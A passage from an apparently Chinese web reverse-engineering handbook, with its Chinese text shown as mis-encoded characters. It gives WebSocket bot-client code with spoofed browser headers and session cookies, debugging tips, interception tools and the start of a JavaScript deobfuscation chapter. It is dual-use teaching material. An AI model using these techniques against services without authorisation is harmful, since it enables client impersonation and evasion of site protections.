                <span class="bp">self</span><span class="o">.</span><span class="n">heartbeat_loop</span><span class="p">()</span>
            <span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">ChatClient</span><span class="p">(</span><span class="s2">&quot;bot_user&quot;</span><span class="p">,</span> <span class="s2">&quot;bot_password&quot;</span><span class="p">)</span>
    <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
</code></pre>
          </div>

          <hr />

          <h2 id="8-å¸¸è§é—®é¢˜ä¸è°ƒè¯•">8. å¸¸è§é—®é¢˜ä¸è°ƒè¯•</h2>

          <h3 id="81-è¿æ¥å¤±è´¥">8.1 è¿æ¥å¤±è´¥</h3>

          <p><strong>é”™è¯¯</strong>: <code>WebSocketException: Invalid HTTP status code: 403</code></p>

          <p><strong>åŸå› </strong>:</p>

          <ul>
            <li>ç¼ºå°‘å¿…è¦çš„ Headersï¼ˆå¦‚ Originã€User-Agentï¼‰</li>
            <li>Token è¿‡æœŸæˆ–æ— æ•ˆ</li>
            <li>IP è¢«å°ç¦</li>
          </ul>

          <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1"># æ·»åŠ å®Œæ•´çš„ Headers</span>
<span class="n">ws</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span>
    <span class="n">uri</span><span class="p">,</span>
    <span class="n">extra_headers</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Origin&quot;</span><span class="p">:</span> <span class="s2">&quot;https://example.com&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="s2">&quot;https://example.com/chat&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="s2">&quot;session=YOUR_SESSION_COOKIE&quot;</span>
    <span class="p">}</span>
<span class="p">)</span>
</code></pre>
          </div>

          <h3 id="82-å¿ƒè·³è¶…æ—¶">8.2 å¿ƒè·³è¶…æ—¶</h3>

          <p><strong>ç°è±¡</strong>: è¿æ¥è¿‡å‡ åˆ†é’Ÿåè‡ªåŠ¨æ–­å¼€</p>

          <p><strong>åŸå› </strong>: æœåŠ¡å™¨è¦æ±‚å®šæœŸå‘é€å¿ƒè·³ï¼Œå¦åˆ™ä¼šä¸»åŠ¨å…³é—­è¿æ¥</p>

          <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">heartbeat_loop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">wait_for</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;ping&quot;</span><span class="p">})),</span>
                <span class="n">timeout</span><span class="o">=</span><span class="mf">5.0</span>  <span class="c1"># 5 ç§’è¶…æ—¶</span>
            <span class="p">)</span>
            <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>  <span class="c1"># æ¯ 30 ç§’å‘é€ä¸€æ¬¡</span>
        <span class="k">except</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">TimeoutError</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[å¿ƒè·³è¶…æ—¶]&quot;</span><span class="p">)</span>
            <span class="k">break</span>
</code></pre>
          </div>

          <h3 id="83-æ¶ˆæ¯ä¹±åº">8.3 æ¶ˆæ¯ä¹±åº</h3>

          <p><strong>ç°è±¡</strong>: æ”¶åˆ°çš„æ¶ˆæ¯é¡ºåºä¸å¯¹</p>

          <p><strong>åŸå› </strong>: ç½‘ç»œå»¶è¿Ÿæˆ–æœåŠ¡å™¨å¹¶å‘å¤„ç†</p>

          <p><strong>è§£å†³æ–¹æ¡ˆ</strong>: ä½¿ç”¨åºåˆ—å· (seq) é‡æ–°æ’åº</p>

          <div class="codehilite">
            <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">MessageQueue</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">queue</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">add_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">seq</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">queue</span><span class="p">[</span><span class="n">seq</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">process_queue</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_queue</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŒ‰åºå¤„ç†æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">queue</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">queue</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[å¤„ç†æ¶ˆæ¯ </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre>
          </div>

          <h3 id="84-è°ƒè¯•æŠ€å·§">8.4 è°ƒè¯•æŠ€å·§</h3>

          <p><strong>æ‰“å°åå…­è¿›åˆ¶</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">hex_dump</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ‰“å°åå…­è¿›åˆ¶&quot;&quot;&quot;</span>
    <span class="n">hex_str</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s1">02x</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[Hex] </span><span class="si">{</span><span class="n">hex_str</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="n">hex_dump</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</code></pre>
          </div>

          <p><strong>ä¿å­˜åˆ°æ–‡ä»¶</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>

<span class="k">def</span><span class="w"> </span><span class="nf">log_message</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">direction</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è®°å½•æ¶ˆæ¯åˆ°æ–‡ä»¶&quot;&quot;&quot;</span>
    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">isoformat</span><span class="p">()</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ws_log.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">direction</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">send_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">log_message</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="s2">&quot;SEND&quot;</span><span class="p">)</span>
    <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
    <span class="n">log_message</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="s2">&quot;RECV&quot;</span><span class="p">)</span>
    <span class="c1"># ... å¤„ç†é€»è¾‘</span>
</code></pre>
          </div>

          <hr />

          <h2 id="9-å·¥å…·æ¨è">9. å·¥å…·æ¨è</h2>

          <table>
            <thead>
              <tr>
                <th>å·¥å…·</th>
                <th>ç”¨é€”</th>
                <th>å¹³å°</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Chrome DevTools</strong></td>
                <td>æµè§ˆå™¨å†… WS æŠ“åŒ…è°ƒè¯•</td>
                <td>Chrome</td>
              </tr>
              <tr>
                <td><strong>Wireshark</strong></td>
                <td>æ·±åº¦åŒ…åˆ†æã€SSL è§£å¯†</td>
                <td>å…¨å¹³å°</td>
              </tr>
              <tr>
                <td><strong>mitmproxy</strong></td>
                <td>å¯ç¼–ç¨‹æ‹¦æˆªå’Œä¿®æ”¹</td>
                <td>å…¨å¹³å°</td>
              </tr>
              <tr>
                <td><strong>wscat</strong></td>
                <td>å‘½ä»¤è¡Œ WS å®¢æˆ·ç«¯æµ‹è¯•</td>
                <td>Node.js</td>
              </tr>
              <tr>
                <td><strong>websocat</strong></td>
                <td>é«˜çº§å‘½ä»¤è¡Œ WS å·¥å…·</td>
                <td>Rust</td>
              </tr>
              <tr>
                <td><strong>Postman</strong></td>
                <td>API æµ‹è¯•ï¼ˆæ”¯æŒ WSï¼‰</td>
                <td>å…¨å¹³å°</td>
              </tr>
            </tbody>
          </table>

          <p><strong>wscat ä½¿ç”¨</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>wscat

<span class="c1"># è¿æ¥</span>
wscat<span class="w"> </span>-c<span class="w"> </span>wss://echo.websocket.org

<span class="c1"># å‘é€æ¶ˆæ¯</span>
&gt;<span class="w"> </span>Hello<span class="w"> </span>WebSocket

<span class="c1"># å¸¦ Header</span>
wscat<span class="w"> </span>-c<span class="w"> </span>wss://example.com/ws<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer token123&quot;</span>
</code></pre>
          </div>

          <hr />

          <h2 id="æ€»ç»“">æ€»ç»“</h2>

          <p>WebSocket é€†å‘çš„å…³é”®æ­¥éª¤ï¼š</p>

          <ol>
            <li>âœ… <strong>æŠ“åŒ…åˆ†æ</strong>: Chrome DevTools / Wireshark / mitmproxy</li>
            <li>âœ… <strong>åè®®è¯†åˆ«</strong>: JSON / Protobuf / MsgPack / è‡ªå®šä¹‰æ ¼å¼</li>
            <li>âœ… <strong>Hook æŠ€æœ¯</strong>: åŠ«æŒ WebSocket æ„é€ å‡½æ•°å’Œæ–¹æ³•</li>
            <li>âœ… <strong>å®¢æˆ·ç«¯å®ç°</strong>: Python websockets åº“ï¼Œå¤„ç†è®¤è¯ã€å¿ƒè·³ã€é‡è¿</li>
            <li>âœ… <strong>åŠ å¯†å¤„ç†</strong>: AES/RSA åŠ å¯†æ¶ˆæ¯çš„åŠ è§£å¯†</li>
            <li>âœ… <strong>è°ƒè¯•æŠ€å·§</strong>: æ—¥å¿—è®°å½•ã€åå…­è¿›åˆ¶ dumpã€æ¶ˆæ¯é‡æ’åº</li>
          </ol>

          <p><strong>è®°ä½</strong>: WebSocket é€†å‘çš„æœ¬è´¨æ˜¯<strong>åè®®é€†å‘</strong> â€”â€” ææ¸…æ¥šå®ƒ"è¯´ä»€ä¹ˆè¯"ï¼ˆPayload
            æ ¼å¼ï¼‰ä»¥åŠ"æ€ä¹ˆè¯´è¯"ï¼ˆçŠ¶æ€æœºã€å¿ƒè·³ã€è®¤è¯ï¼‰ï¼Œä½ å°±èƒ½ä¼ªé€ å®ƒã€‚</p>

          <hr />

          <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

          <ul>
            <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
            <li><a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘ä¸é‡æ”¾æ”»å‡»</a></li>
            <li><a href="#02-Tooling-wireshark-guide">Wireshark ä½¿ç”¨æŒ‡å—</a></li>
            <li><a href="#03-Basic-Recipes-hooking-techniques">Hooking æŠ€æœ¯</a></li>
            <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
          </ul>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part V: Advanced Recipes</h1>

    <div class="section" id="04-Advanced-Recipes-javascript-deobfuscation">
      <h2>32. JavaScript Deobfuscation</h2>
      <h1 id="javascript-åæ··æ·†-deobfuscation">JavaScript åæ··æ·† (Deobfuscation)</h1>

      <p>ä½¿ç”¨ AST å·¥å…·å’Œæ‰‹åŠ¨æŠ€å·§ï¼Œè¿˜åŸæ··æ·†ä»£ç çš„å¯è¯»æ€§ï¼Œå¿«é€Ÿå®šä½æ ¸å¿ƒåŠ å¯†é€»è¾‘ã€‚</p>

      <hr />

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­â­â­ (é«˜çº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>2-8 å°æ—¶ (æ ¹æ®æ··æ·†å¤æ‚åº¦)</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome DevTools, Babel, AST Explorer, Node.js</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>æ··æ·†ä»£ç åˆ†æã€åŠ å¯†ç®—æ³•æå–ã€æ¶æ„ä»£ç åˆ†æ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ ç›®æ ‡">ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>

      <p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… è¯†åˆ«å¸¸è§çš„æ··æ·†æŠ€æœ¯ç±»å‹</li>
        <li>âœ… ä½¿ç”¨ AST å·¥å…·æ‰¹é‡è¿˜åŸæ··æ·†ä»£ç </li>
        <li>âœ… æ‰‹åŠ¨åˆ†æå’Œè¿˜åŸå…³é”®é€»è¾‘</li>
        <li>âœ… å¤„ç†å­—ç¬¦ä¸²æ•°ç»„ã€æ§åˆ¶æµå¹³å¦åŒ–ç­‰é«˜çº§æ··æ·†</li>
        <li>âœ… ä½¿ç”¨è°ƒè¯•æŠ€å·§ç»•è¿‡æ··æ·†ä»£ç </li>
      </ul>

      <hr />

      <h2 id="æ ¸å¿ƒæ¦‚å¿µ">ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>

      <p>æ··æ·† (Obfuscation) æ˜¯ Web
        é€†å‘æœ€å¤§çš„æ‹¦è·¯è™ã€‚ä»£ç æ··æ·†æŠ€æœ¯é€šè¿‡å˜æ¢ä»£ç ç»“æ„å’Œè¯­ä¹‰ï¼Œåœ¨ä¸æ”¹å˜ç¨‹åºåŠŸèƒ½çš„å‰æä¸‹å¤§å¹…å¢åŠ é€†å‘åˆ†æçš„éš¾åº¦ã€‚å¸¸è§çš„æ··æ·†æ‰‹æ®µåŒ…æ‹¬å˜é‡åå‹ç¼©ã€å­—ç¬¦ä¸²æ•°ç»„åŠ å¯†ã€å¤§æ•´æ•°è¿ç®—ã€æ§åˆ¶æµå¹³å¦åŒ–ã€æ­»ä»£ç æ³¨å…¥ç­‰ã€‚</p>

      <p><strong>åæ··æ·†çš„æœ¬è´¨</strong>ï¼šé€šè¿‡è‡ªåŠ¨åŒ–æˆ–æ‰‹åŠ¨æ‰‹æ®µè¿˜åŸä»£ç çš„å¯è¯»æ€§ï¼Œç†è§£æ ¸å¿ƒåŠ å¯†é€»è¾‘ã€‚</p>

      <p><strong>é‡è¦æé†’</strong>ï¼šåæ··æ·†ä¸æ˜¯ç›®çš„ï¼Œ<strong>ç†è§£é€»è¾‘</strong>æ‰æ˜¯ã€‚æœ‰æ—¶æˆ‘ä»¬ä¸éœ€è¦è¿˜åŸå…¨éƒ¨ä»£ç ï¼Œåªè¦æŠŠå…³é”®çš„åŠ å¯†å‡½æ•°è¿˜åŸå‡ºæ¥ï¼Œæˆ–è€…ç›´æ¥æ‰¾åˆ°è°ƒç”¨å…¥å£å³å¯ã€‚</p>

      <p><strong>åæ··æ·†ç­–ç•¥</strong>:</p>

      <pre><code>1. è¯†åˆ«æ··æ·†ç±»å‹ â†’ 2. é€‰æ‹©å·¥å…·/æ–¹æ³• â†’ 3. å±€éƒ¨è¿˜åŸ â†’ 4. ç†è§£é€»è¾‘ â†’ 5. æå–å…³é”®ä»£ç 
</code></pre>

      <hr />

      <h2 id="1-æ··æ·†æŠ€æœ¯åˆ†ç±»">1. æ··æ·†æŠ€æœ¯åˆ†ç±»</h2>

      <h3 id="11-å˜é‡åæ··æ·†-identifier-mangling">1.1 å˜é‡åæ··æ·† (Identifier Mangling)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>æ‰€æœ‰å˜é‡ã€å‡½æ•°åå˜æˆæ— æ„ä¹‰çš„çŸ­å­—ç¬¦: <code>a</code>, <code>b</code>, <code>_0x1234</code></li>
        <li>ç±»ä¼¼å‹ç¼©å™¨ï¼ˆUglifyã€Terserï¼‰çš„è¾“å‡º</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ä»£ç </span>
<span class="kd">function</span><span class="w"> </span><span class="nx">calculatePrice</span><span class="p">(</span><span class="nx">basePrice</span><span class="p">,</span><span class="w"> </span><span class="nx">discount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">basePrice</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">discount</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">a</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">c</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ul>
        <li>ä½¿ç”¨ Chrome DevTools çš„ &#8220;Rename Symbol&#8221; åŠŸèƒ½æ‰‹åŠ¨é‡å‘½å</li>
        <li>ä½¿ç”¨ JSNice (http://jsnice.org/) è‡ªåŠ¨æ¨æµ‹å˜é‡å</li>
        <li>é€šè¿‡ä¸Šä¸‹æ–‡ç†è§£å˜é‡å«ä¹‰</li>
      </ul>

      <hr />

      <h3 id="12-å­—ç¬¦ä¸²æ•°ç»„æ··æ·†-string-array-obfuscation">1.2 å­—ç¬¦ä¸²æ•°ç»„æ··æ·† (String Array Obfuscation)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ä»£ç é¡¶éƒ¨æœ‰ä¸€ä¸ªå·¨å¤§çš„å­—ç¬¦ä¸²æ•°ç»„: <code>var _0x1234 = ['str1', 'str2', ...]</code></li>
        <li>å­—ç¬¦ä¸²é€šè¿‡ç´¢å¼•è®¿é—®: <code>_0x1234[0]</code> è€Œä¸æ˜¯ç›´æ¥å†™ <code>'str1'</code></li>
        <li>é€šå¸¸é…åˆæ•°ç»„æ—‹è½¬ï¼ˆShuffleï¼‰å’Œè§£å¯†å‡½æ•°</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†åçš„ä»£ç </span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;aGVsbG8=&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d29ybGQ=&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Y29uc29sZQ==&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;bG9n&#39;</span><span class="p">];</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x4a5b3e</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x3e7a90</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">_0x4a5b3e</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x4a5b3e</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="nx">_0x3e7a90</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x2f8c1d</span><span class="p">);</span>
<span class="p">}(</span><span class="nx">_0xabcd</span><span class="p">,</span><span class="w"> </span><span class="mh">0x123</span><span class="p">));</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">_0x5678</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x4a5b3e</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">_0x4a5b3e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x4a5b3e</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x0</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x3e7a90</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="p">[</span><span class="nx">_0x4a5b3e</span><span class="p">];</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">_0x5678</span><span class="p">[</span><span class="s1">&#39;initialized&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kc">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Base64 è§£ç é€»è¾‘</span>
<span class="w">        </span><span class="nx">_0x5678</span><span class="p">[</span><span class="s1">&#39;decoder&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// ...è§£ç ä»£ç </span>
<span class="w">        </span><span class="p">};</span>
<span class="w">        </span><span class="nx">_0x5678</span><span class="p">[</span><span class="s1">&#39;initialized&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="p">[];</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x5678</span><span class="p">[</span><span class="s1">&#39;decoder&#39;</span><span class="p">](</span><span class="nx">_0x3e7a90</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="p">;</span>
<span class="p">};</span>

<span class="nx">console</span><span class="p">[</span><span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x0&#39;</span><span class="p">)](</span><span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">));</span><span class="w"> </span><span class="c1">// å®é™…æ˜¯ console.log(&#39;hello&#39;)</span>
</code></pre>
      </div>

      <p><strong>å¯¹æŠ—æ–¹æ³•</strong>:</p>

      <ol>
        <li>åœ¨ Console ä¸­æ‰§è¡Œæ•°ç»„å’Œæ—‹è½¬å‡½æ•°ï¼Œä½¿å…¶åˆå§‹åŒ–</li>
        <li>åœ¨ Console ä¸­æŒ‚è½½è§£å¯†å‡½æ•° <code>_0x5678</code></li>
        <li>ä½¿ç”¨æ­£åˆ™æ›¿æ¢ï¼š<code>_0x5678\('0x(\d+)'\)</code> â†’ æ‰§è¡Œå¹¶æ›¿æ¢ä¸ºçœŸå®å­—ç¬¦ä¸²</li>
        <li>ä½¿ç”¨ AST å·¥å…·è‡ªåŠ¨è¿˜åŸï¼ˆè¯¦è§åæ–‡ï¼‰</li>
      </ol>

      <hr />

      <h3 id="13-æ§åˆ¶æµå¹³å¦åŒ–-control-flow-flattening">1.3 æ§åˆ¶æµå¹³å¦åŒ– (Control Flow Flattening)</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>æ•´ä¸ªå‡½æ•°å˜æˆä¸€ä¸ª <code>while(true)</code> å¾ªç¯</li>
        <li>ä½¿ç”¨ <code>switch-case</code> çŠ¶æ€æœºæ§åˆ¶æ‰§è¡Œæµç¨‹</li>
        <li>ä»£ç å—è¢«æ‰“ä¹±ï¼Œé€šè¿‡çŠ¶æ€å˜é‡è·³è½¬</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ä»£ç </span>
<span class="kd">function</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
